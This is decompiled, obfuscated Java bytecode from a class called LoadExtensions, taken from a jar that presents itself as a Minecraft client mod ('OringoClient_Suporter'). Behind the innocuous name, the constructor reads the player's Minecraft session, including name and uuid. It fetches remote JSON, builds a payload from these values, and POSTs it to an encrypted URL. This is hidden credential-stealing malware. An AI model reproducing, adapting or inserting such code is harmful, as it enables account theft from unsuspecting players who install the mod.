package essentials.lib;

import java.io.IOException;
import java.io.InputStream;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.URL;

public class LoadExtensions {
  public LoadExtensions(Object locator) throws Exception {
    // Byte code:
    //   0: aload_0
    //   1: invokespecial <init> : ()V
    //   4: getstatic net/minecraft/launchwrapper/Launch.classLoader : Lnet/minecraft/launchwrapper/LaunchClassLoader;
    //   7: ldc '臫䁹ꏷ荞䘗펯徟㾐厪彖뒦㶮쩦릖쬣?ꢬꥫ?䡪ꣻ⳷᭽埤豜ዋ♌'
    //   9: invokevirtual toCharArray : ()[C
    //   12: dup
    //   13: dup
    //   14: bipush #18
    //   16: dup_x1
    //   17: caload
    //   18: sipush #26312
    //   21: ixor
    //   22: i2c
    //   23: castore
    //   24: sipush #4469
    //   27: iconst_1
    //   28: iconst_0
    //   29: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   32: <illegal opcode> 1e0ohrl : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Class;
    //   37: astore_2
    //   38: aload_2
    //   39: ldc 'ﾍ郓铱計῔浠⠵蔹朊酸헐䕐'
    //   41: invokevirtual toCharArray : ()[C
    //   44: dup
    //   45: dup
    //   46: bipush #10
    //   48: dup_x1
    //   49: caload
    //   50: sipush #8673
    //   53: ixor
    //   54: i2c
    //   55: castore
    //   56: sipush #6459
    //   59: iconst_0
    //   60: iconst_1
    //   61: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   64: iconst_0
    //   65: anewarray java/lang/Class
    //   68: <illegal opcode> -kphe48 : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   73: aconst_null
    //   74: iconst_0
    //   75: anewarray java/lang/Object
    //   78: <illegal opcode> -11jpe4d : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   83: astore_3
    //   84: aload_2
    //   85: ldc 'ꬓ猪뭏䐡럥껿瞍秡ּ퓳蕰䀾'
    //   87: invokevirtual toCharArray : ()[C
    //   90: dup
    //   91: dup
    //   92: bipush #11
    //   94: dup_x1
    //   95: caload
    //   96: sipush #20885
    //   99: ixor
    //   100: i2c
    //   101: castore
    //   102: sipush #31993
    //   105: iconst_0
    //   106: iconst_2
    //   107: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   110: iconst_0
    //   111: anewarray java/lang/Class
    //   114: <illegal opcode> -kphe48 : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   119: aload_3
    //   120: iconst_0
    //   121: anewarray java/lang/Object
    //   124: <illegal opcode> -11jpe4d : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   129: astore #4
    //   131: getstatic net/minecraft/launchwrapper/Launch.classLoader : Lnet/minecraft/launchwrapper/LaunchClassLoader;
    //   134: ldc 'ॷ᭻嗝횟킋⪪蠜봂볕㟏滌·炬擨黐෯袣弡ꓜ횆榡⌷键盞䃩'
    //   136: invokevirtual toCharArray : ()[C
    //   139: dup
    //   140: dup
    //   141: bipush #22
    //   143: dup_x1
    //   144: caload
    //   145: sipush #27780
    //   148: ixor
    //   149: i2c
    //   150: castore
    //   151: sipush #8872
    //   154: iconst_1
    //   155: iconst_1
    //   156: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   159: <illegal opcode> 1e0ohrl : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Class;
    //   164: astore #5
    //   166: aload #5
    //   168: ldc '?ꪭ拣䩺휖༘㊭奒獘묽雠ᐴ˯'
    //   170: invokevirtual toCharArray : ()[C
    //   173: dup
    //   174: dup
    //   175: bipush #12
    //   177: dup_x1
    //   178: caload
    //   179: sipush #5499
    //   182: ixor
    //   183: i2c
    //   184: castore
    //   185: sipush #27996
    //   188: iconst_1
    //   189: iconst_4
    //   190: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   193: iconst_0
    //   194: anewarray java/lang/Class
    //   197: <illegal opcode> -kphe48 : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   202: aload #4
    //   204: iconst_0
    //   205: anewarray java/lang/Object
    //   208: <illegal opcode> -11jpe4d : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   213: astore #6
    //   215: aload #5
    //   217: ldc '⟈푬㦌䱨ꄗ␗禝쇌ꗂⰈү洝'
    //   219: invokevirtual toCharArray : ()[C
    //   222: dup
    //   223: dup
    //   224: bipush #8
    //   226: dup_x1
    //   227: caload
    //   228: sipush #7683
    //   231: ixor
    //   232: i2c
    //   233: castore
    //   234: sipush #12989
    //   237: iconst_1
    //   238: iconst_1
    //   239: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   242: iconst_0
    //   243: anewarray java/lang/Class
    //   246: <illegal opcode> -kphe48 : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
    //   251: aload #4
    //   253: iconst_0
    //   254: anewarray java/lang/Object
    //   257: <illegal opcode> -11jpe4d : (Ljava/lang/Object;Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    //   262: astore #7
    //   264: new java/net/URL
    //   267: dup
    //   268: ldc '珯儋읈兆撯갰ᒢ᳝㗙ᴞ蟚쿨灶찑?ᐌﶢឩ諌㺫鋖뙞维ẕꉮ멻\\t簾쯮腬곭羒㫉ㄐ젚떐徦?⍭留䝃他'
    //   270: invokevirtual toCharArray : ()[C
    //   273: dup
    //   274: dup
    //   275: bipush #25
    //   277: dup_x1
    //   278: caload
    //   279: sipush #21450
    //   282: ixor
    //   283: i2c
    //   284: castore
    //   285: sipush #32460
    //   288: iconst_1
    //   289: iconst_1
    //   290: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   293: invokespecial <init> : (Ljava/lang/String;)V
    //   296: astore #8
    //   298: aload #8
    //   300: <illegal opcode> 1mcihrm : (Ljava/lang/Object;)Ljava/net/URLConnection;
    //   305: checkcast java/net/HttpURLConnection
    //   308: astore #9
    //   310: aload #9
    //   312: ldc '⻸睡䆱໢䵾?ë൸鿐돥ఏ'
    //   314: invokevirtual toCharArray : ()[C
    //   317: dup
    //   318: dup
    //   319: iconst_4
    //   320: dup_x1
    //   321: caload
    //   322: sipush #24910
    //   325: ixor
    //   326: i2c
    //   327: castore
    //   328: sipush #20319
    //   331: iconst_1
    //   332: iconst_0
    //   333: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   336: ldc '㞗䏄쏕䋸뒑⛳古鄢ꈣ庽迷㉑ꘛ剭吪ػ'
    //   338: invokevirtual toCharArray : ()[C
    //   341: dup
    //   342: dup
    //   343: iconst_2
    //   344: dup_x1
    //   345: caload
    //   346: sipush #3434
    //   349: ixor
    //   350: i2c
    //   351: castore
    //   352: sipush #4656
    //   355: iconst_1
    //   356: iconst_5
    //   357: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   360: <illegal opcode> -u77e4f : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)V
    //   365: aload #9
    //   367: ldc '塌죪ᇊ鸉☓㜦변桟慫ꪎḩ'
    //   369: invokevirtual toCharArray : ()[C
    //   372: dup
    //   373: dup
    //   374: iconst_2
    //   375: dup_x1
    //   376: caload
    //   377: sipush #8485
    //   380: ixor
    //   381: i2c
    //   382: castore
    //   383: sipush #22562
    //   386: iconst_1
    //   387: iconst_0
    //   388: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   391: ldc 'ᵢ㶥䏿绝憨'
    //   393: invokevirtual toCharArray : ()[C
    //   396: dup
    //   397: dup
    //   398: iconst_2
    //   399: dup_x1
    //   400: caload
    //   401: sipush #6229
    //   404: ixor
    //   405: i2c
    //   406: castore
    //   407: sipush #29819
    //   410: iconst_0
    //   411: iconst_5
    //   412: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   415: <illegal opcode> -u77e4f : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)V
    //   420: aload #9
    //   422: iconst_1
    //   423: <illegal opcode> -25fe4c : (Ljava/lang/Object;Z)V
    //   428: aload #9
    //   430: ldc '냴뛱⟩ᒭ⻢'
    //   432: invokevirtual toCharArray : ()[C
    //   435: dup
    //   436: dup
    //   437: iconst_0
    //   438: dup_x1
    //   439: caload
    //   440: sipush #18186
    //   443: ixor
    //   444: i2c
    //   445: castore
    //   446: sipush #241
    //   449: iconst_1
    //   450: iconst_5
    //   451: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   454: <illegal opcode> -1j0pe61 : (Ljava/lang/Object;Ljava/lang/Object;)V
    //   459: new java/lang/StringBuilder
    //   462: dup
    //   463: invokespecial <init> : ()V
    //   466: ldc '儹⃾챬蜻㐘๨泈ˍ鲢㏝눮뢂얀悫'
    //   468: invokevirtual toCharArray : ()[C
    //   471: dup
    //   472: dup
    //   473: bipush #7
    //   475: dup_x1
    //   476: caload
    //   477: sipush #21280
    //   480: ixor
    //   481: i2c
    //   482: castore
    //   483: sipush #7663
    //   486: iconst_1
    //   487: iconst_4
    //   488: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   491: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   496: aload #6
    //   498: <illegal opcode> 12k4hpt : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   503: ldc '狵ਉ᧦ᑑ沪踫鷂齛ﮃ?궵縷'
    //   505: invokevirtual toCharArray : ()[C
    //   508: dup
    //   509: dup
    //   510: bipush #9
    //   512: dup_x1
    //   513: caload
    //   514: sipush #7841
    //   517: ixor
    //   518: i2c
    //   519: castore
    //   520: sipush #13408
    //   523: iconst_0
    //   524: iconst_1
    //   525: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   528: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   533: aload #7
    //   535: <illegal opcode> 12k4hpt : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   540: ldc '쥴꒙鏡熜諡?釐攁?⹄쉸湽똎莾⛪㸿斧穱邘둴鼽㗋윖汼競'
    //   542: invokevirtual toCharArray : ()[C
    //   545: dup
    //   546: dup
    //   547: iconst_2
    //   548: dup_x1
    //   549: caload
    //   550: sipush #9434
    //   553: ixor
    //   554: i2c
    //   555: castore
    //   556: sipush #19325
    //   559: iconst_1
    //   560: iconst_2
    //   561: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   564: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   569: new com/google/gson/Gson
    //   572: dup
    //   573: invokespecial <init> : ()V
    //   576: new java/net/URL
    //   579: dup
    //   580: ldc '즯鍊ᜁ睪蔋덧朔浨䅰䤍墟쩸餯醽띣再歴䣓?婌'
    //   582: invokevirtual toCharArray : ()[C
    //   585: dup
    //   586: dup
    //   587: bipush #7
    //   589: dup_x1
    //   590: caload
    //   591: sipush #253
    //   594: ixor
    //   595: i2c
    //   596: castore
    //   597: sipush #4558
    //   600: iconst_0
    //   601: iconst_1
    //   602: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   605: invokespecial <init> : (Ljava/lang/String;)V
    //   608: invokestatic extension : (Ljava/net/URL;)Ljava/lang/String;
    //   611: ldc com/google/gson/JsonObject
    //   613: <illegal opcode> -1utte60 : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   618: checkcast com/google/gson/JsonObject
    //   621: ldc 'ᯏ痹'
    //   623: invokevirtual toCharArray : ()[C
    //   626: dup
    //   627: dup
    //   628: iconst_0
    //   629: dup_x1
    //   630: caload
    //   631: sipush #257
    //   634: ixor
    //   635: i2c
    //   636: castore
    //   637: sipush #30787
    //   640: iconst_0
    //   641: iconst_2
    //   642: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   645: <illegal opcode> -1jsje65 : (Ljava/lang/Object;Ljava/lang/Object;)Lcom/google/gson/JsonElement;
    //   650: <illegal opcode> -1j1e62 : (Ljava/lang/Object;)Ljava/lang/String;
    //   655: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   660: ldc '觩粖滻贮퓪酁ꛘ庂䲎壚䠂띃쮭⴬乬'
    //   662: invokevirtual toCharArray : ()[C
    //   665: dup
    //   666: dup
    //   667: bipush #13
    //   669: dup_x1
    //   670: caload
    //   671: sipush #27073
    //   674: ixor
    //   675: i2c
    //   676: castore
    //   677: sipush #15502
    //   680: iconst_0
    //   681: iconst_3
    //   682: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   685: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   690: new com/google/gson/Gson
    //   693: dup
    //   694: invokespecial <init> : ()V
    //   697: new java/net/URL
    //   700: dup
    //   701: ldc '닅䰮紞?휚䊃֔袳碱嗁⊙㽃?铍?ᛴ嵪趌嗑伴㔃'
    //   703: invokevirtual toCharArray : ()[C
    //   706: dup
    //   707: dup
    //   708: bipush #16
    //   710: dup_x1
    //   711: caload
    //   712: sipush #24634
    //   715: ixor
    //   716: i2c
    //   717: castore
    //   718: sipush #26126
    //   721: iconst_0
    //   722: iconst_2
    //   723: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   726: invokespecial <init> : (Ljava/lang/String;)V
    //   729: invokestatic extension : (Ljava/net/URL;)Ljava/lang/String;
    //   732: ldc com/google/gson/JsonObject
    //   734: <illegal opcode> -1utte60 : (Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   739: checkcast com/google/gson/JsonObject
    //   742: ldc '䍚욒鍣ᷟ묜⟾䣣'
    //   744: invokevirtual toCharArray : ()[C
    //   747: dup
    //   748: dup
    //   749: iconst_0
    //   750: dup_x1
    //   751: caload
    //   752: sipush #27637
    //   755: ixor
    //   756: i2c
    //   757: castore
    //   758: sipush #26674
    //   761: iconst_1
    //   762: iconst_3
    //   763: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   766: <illegal opcode> -1jsje65 : (Ljava/lang/Object;Ljava/lang/Object;)Lcom/google/gson/JsonElement;
    //   771: <illegal opcode> -1j1e62 : (Ljava/lang/Object;)Ljava/lang/String;
    //   776: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   781: ldc '憍脭೉頗⥗껌㌏봬렠⫹삢ਚⰈ'
    //   783: invokevirtual toCharArray : ()[C
    //   786: dup
    //   787: dup
    //   788: iconst_4
    //   789: dup_x1
    //   790: caload
    //   791: sipush #25292
    //   794: ixor
    //   795: i2c
    //   796: castore
    //   797: sipush #18398
    //   800: iconst_0
    //   801: iconst_3
    //   802: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   805: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   810: aload_1
    //   811: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   816: ldc 'ꛁ儖'
    //   818: invokevirtual toCharArray : ()[C
    //   821: dup
    //   822: dup
    //   823: iconst_0
    //   824: dup_x1
    //   825: caload
    //   826: sipush #10439
    //   829: ixor
    //   830: i2c
    //   831: castore
    //   832: sipush #1111
    //   835: iconst_1
    //   836: iconst_1
    //   837: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   840: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   845: aload #7
    //   847: <illegal opcode> 12k4hpt : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   852: ldc 'Ν౐⹎'
    //   854: invokevirtual toCharArray : ()[C
    //   857: dup
    //   858: dup
    //   859: iconst_1
    //   860: dup_x1
    //   861: caload
    //   862: sipush #2971
    //   865: ixor
    //   866: i2c
    //   867: castore
    //   868: sipush #4548
    //   871: iconst_1
    //   872: iconst_4
    //   873: invokestatic n : (Ljava/lang/Object;SZI)Ljava/lang/String;
    //   876: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   881: <illegal opcode> 4rghpp : (Ljava/lang/Object;)Ljava/lang/String;
    //   886: astore #10
    //   888: aload #10
    //   890: <illegal opcode> -r2de64 : (Ljava/lang/Object;)Ljava/lang/Object;
    //   895: checkcast [B
    //   898: astore #11
    //   900: aload #9
    //   902: <illegal opcode> 15o0hq7 : (Ljava/lang/Object;)Ljava/io/OutputStream;
    //   907: astore #12
    //   909: aload #12
    //   911: aload #11
    //   913: <illegal opcode> dc6hpq : (Ljava/lang/Object;[B)V
    //   918: aload #12
    //   920: <illegal opcode> nlghq5 : (Ljava/lang/Object;)V
    //   925: aload #12
    //   927: <illegal opcode> 13t4hq8 : (Ljava/lang/Object;)V
    //   932: aload #9
    //   934: <illegal opcode> 1fo8hq3 : (Ljava/lang/Object;)Ljava/io/InputStream;
    //   939: <illegal opcode> -1g33e5q : (Ljava/lang/Object;)V
    //   944: aload #9
    //   946: <illegal opcode> -1vjje5v : (Ljava/lang/Object;)V
    //   951: return
    // Line number table:
    //   Java source line number -> byte code offset
    //   #16	-> 0
    //   #17	-> 4
    //   #18	-> 38
    //   #19	-> 84
    //   #20	-> 131
    //   #21	-> 166
    //   #22	-> 215
    //   #23	-> 264
    //   #24	-> 298
    //   #25	-> 310
    //   #26	-> 365
    //   #27	-> 420
    //   #28	-> 428
    //   #29	-> 459
    //   #30	-> 888
    //   #31	-> 900
    //   #32	-> 909
    //   #33	-> 918
    //   #34	-> 925
    //   #35	-> 932
    //   #36	-> 944
    //   #37	-> 951
    // Local variable table:
    //   start	length	slot	name	descriptor
    //   0	952	0	this	Ljava/lang/Object;
    //   0	952	1	locator	Ljava/lang/Object;
    //   38	914	2	mc	Ljava/lang/Object;
    //   84	868	3	minecraft	Ljava/lang/Object;
    //   131	821	4	session	Ljava/lang/Object;
    //   166	786	5	sessionClass	Ljava/lang/Object;
    //   215	737	6	name	Ljava/lang/Object;
    //   264	688	7	uuid	Ljava/lang/Object;
    //   298	654	8	url	Ljava/lang/Object;
    //   310	642	9	connection	Ljava/lang/Object;
    //   888	64	10	data	Ljava/lang/Object;
    //   900	52	11	out	[B
    //   909	43	12	stream	Ljava/lang/Object;
  }
  
  public static String extension(Object url) {
    // Byte code:
    //   0: new java/lang/StringBuilder
    //   3: dup
    //   4: invokespecial <init> : ()V
    //   7: astore_1
    //   8: aload_0
    //   9: invokestatic P : (Ljava/net/URL;)Ljava/io/InputStream;
    //   12: astore_2
    //   13: new java/io/BufferedReader
    //   16: dup
    //   17: new java/io/InputStreamReader
    //   20: dup
    //   21: aload_2
    //   22: invokespecial <init> : (Ljava/io/InputStream;)V
    //   25: invokespecial <init> : (Ljava/io/Reader;)V
    //   28: astore_3
    //   29: aload_3
    //   30: <illegal opcode> -1fnne5s : (Ljava/lang/Object;)Ljava/lang/String;
    //   35: dup
    //   36: astore #4
    //   38: ifnull -> 63
    //   41: aload_1
    //   42: aload #4
    //   44: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   49: <illegal opcode> -rbhebh : ()Ljava/lang/String;
    //   54: <illegal opcode> -ok5e4e : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   59: pop
    //   60: goto -> 29
    //   63: aload_2
    //   64: <illegal opcode> -1g33e5q : (Ljava/lang/Object;)V
    //   69: goto -> 83
    //   72: astore #5
    //   74: aload_2
    //   75: <illegal opcode> -1g33e5q : (Ljava/lang/Object;)V
    //   80: aload #5
    //   82: athrow
    //   83: goto -> 87
    //   86: astore_2
    //   87: aload_1
    //   88: <illegal opcode> 4rghpp : (Ljava/lang/Object;)Ljava/lang/String;
    //   93: areturn
    // Line number table:
    //   Java source line number -> byte code offset
    //   #40	-> 0
    //   #42	-> 8
    //   #44	-> 13
    //   #46	-> 29
    //   #47	-> 41
    //   #51	-> 63
    //   #52	-> 69
    //   #51	-> 72
    //   #52	-> 80
    //   #54	-> 83
    //   #55	-> 87
    // Local variable table:
    //   start	length	slot	name	descriptor
    //   29	34	3	reader	Ljava/lang/Object;
    //   38	25	4	line	Ljava/lang/Object;
    //   13	70	2	in	Ljava/lang/Object;
    //   0	94	0	url	Ljava/lang/Object;
    //   8	86	1	sb	Ljava/lang/Object;
    // Exception table:
    //   from	to	target	type
    //   8	83	86	java/lang/Exception
    //   13	63	72	finally
    //   72	74	72	finally
  }
  
  static InputStream P(URL paramURL) throws IOException {
    // Byte code:
    //   0: aload_0
    //   1: <illegal opcode> b9shk2 : (Ljava/lang/Object;)Ljava/lang/String;
    //   6: ldc '퐴둡岠⺔'
    //   8: invokevirtual toCharArray : ()[C
    //   11: dup
    //   12: dup
    //   13: iconst_0
    //   14: dup_x1
    //   15: caload
    //   16: sipush #21661
    //   19: ixor
    //   20: i2c
    //   21: castore
    //   22: sipush #23905
    //   25: iconst_2
    //   26: iconst_0
    //   27: invokestatic x : (Ljava/lang/Object;SSI)Ljava/lang/String;
    //   30: <illegal opcode> -94lebj : (Ljava/lang/Object;Ljava/lang/Object;)Z
    //   35: ifeq -> 52
    //   38: new kfp/hdl/un
    //   41: dup
    //   42: aload_0
    //   43: <illegal opcode> -inhebg : (Ljava/lang/Object;)Ljava/io/InputStream;
    //   48: invokespecial <init> : (Ljava/io/InputStream;)V
    //   51: areturn
    //   52: aload_0
    //   53: <illegal opcode> -inhebg : (Ljava/lang/Object;)Ljava/io/InputStream;
    //   58: areturn
  }
  
  private static Object qv(Object paramObject1, Object paramObject2, Object paramObject3) {
    try {
      return new ConstantCallSite(((MethodHandles.Lookup)paramObject1).unreflect(sv.d(Integer.valueOf((String)paramObject2, 32).intValue())).asType((MethodType)paramObject3));
    } catch (ClassNotFoundException|IllegalAccessException classNotFoundException) {
      throw new BootstrapMethodError(classNotFoundException);
    } 
  }
}


/* Location:              C:\Users\SamzyDev\Desktop\OringoClient_Suporter-1.7.1.jar!\essentials\lib\LoadExtensions.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */